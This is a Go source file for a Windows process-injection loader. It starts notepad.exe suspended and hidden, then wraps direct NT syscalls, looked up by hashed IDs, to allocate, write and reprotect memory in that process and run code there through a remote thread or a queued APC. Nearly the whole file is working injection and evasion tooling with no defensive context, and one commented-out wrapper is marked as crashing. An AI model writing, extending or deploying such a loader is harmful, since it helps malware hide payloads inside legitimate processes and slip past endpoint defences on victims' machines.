//go:build windows
// +build windows

package loader

import (
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	nullptr = uintptr(0)
)

func createSuspendedProcess() (*windows.ProcessInformation, error) {
	var si windows.StartupInfo
	var pi windows.ProcessInformation

	pCmdStr, err := windows.UTF16PtrFromString("C:\\Windows\\System32\\notepad.exe")
	if err != nil {
		return nil, err
	}

	if err = windows.CreateProcess(
		nil,
		pCmdStr,
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
		nil,
		nil,
		&si,
		&pi,
	); err != nil {
		return nil, err
	}
	return &pi, nil
}

func (pl *Loader) NtAllocateVirtualMemory(
	hProc, baseAddr uintptr,
	memSize int,
	allocType, protectAttr uintptr,
) (uintptr, error) {
	if _, err := Syscall(
		uint16(pl.ntdllApi[int64(-8110667262648832052)].SyscallID),
		hProc,
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(nil)),
		uintptr(unsafe.Pointer(&memSize)),
		allocType,
		protectAttr,
	); err != nil {
		return nullptr, err
	}

	return baseAddr, nil
}

func (pl *Loader) NtWriteVirtualMemory(
	hProc, baseAddr uintptr,
	buf []byte,
	numBytesToWrite int,
) (uintptr, error) {
	if _, err := Syscall(
		uint16(pl.ntdllApi[int64(-8604883203860988910)].SyscallID),
		hProc,
		uintptr(unsafe.Pointer(baseAddr)),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(numBytesToWrite),
		0,
	); err != nil {
		return nullptr, err
	}

	return nullptr, nil
}

func (pl *Loader) NtProtectVirtualMemory(
	hProc, baseAddr uintptr,
	memSize int,
	newProtect uintptr,
	oldProtect uintptr,
) (uintptr, error) {
	if _, err := Syscall(
		uint16(pl.ntdllApi[int64(8609481851873969992)].SyscallID),
		hProc,
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(&memSize)),
		newProtect,
		uintptr(unsafe.Pointer(&oldProtect)),
	); err != nil {
		return nullptr, err
	}

	return oldProtect, nil
}

func (pl *Loader) NtCreateThreadEx(hThread, hProc, baseAddr uintptr) (uintptr, error) {
	if _, err := Syscall(
		uint16(pl.ntdllApi[-8677770082300808784].SyscallID),
		uintptr(unsafe.Pointer(&hThread)), // ThreadHandle
		windows.GENERIC_EXECUTE,           // DesiredAccess
		0,                                 // ObjectAttributes
		hProc,                             // ProcessHandle
		baseAddr,                          // StartRoutine
		0,                                 // Argument
		uintptr(0),                        // CreateFlags
		0,                                 // ZeroBits
		0,                                 // StackSize
		0,                                 // MaxStackSize
		0,                                 // AttributeList
	); err != nil {
		return nullptr, err
	}

	return hThread, nil
}

func (pl *Loader) NtQueueApcThread(hThread, baseAddr uintptr) (uintptr, error) {
	if _, err := Syscall(
		uint16(pl.ntdllApi[-7842467120007854408].SyscallID),
		hThread,    // ThreadHandle
		baseAddr,   // ApcRoutine
		uintptr(0), // ApcRoutineContext (optional)
		0,          // ApcStatusBlock (optional)
		0,          // ApcReserved (optional)
	); err != nil {
		return nullptr, err
	}

	return nullptr, nil
}

// NOT WORKING: gets called but then creashes because of invalid PC
// func (pl *Loader) NtAlertResumeThread(hThread uintptr) (uintptr, error) {
// 	if _, err := Syscall(
// 		uint16(pl.ntdllApi[5863495249448612240].SyscallID),
// 		hThread,
// 		uintptr(0),
// 	); err != nil {
// 		return nullptr, err
// 	}
// 	return nullptr, nil
// }
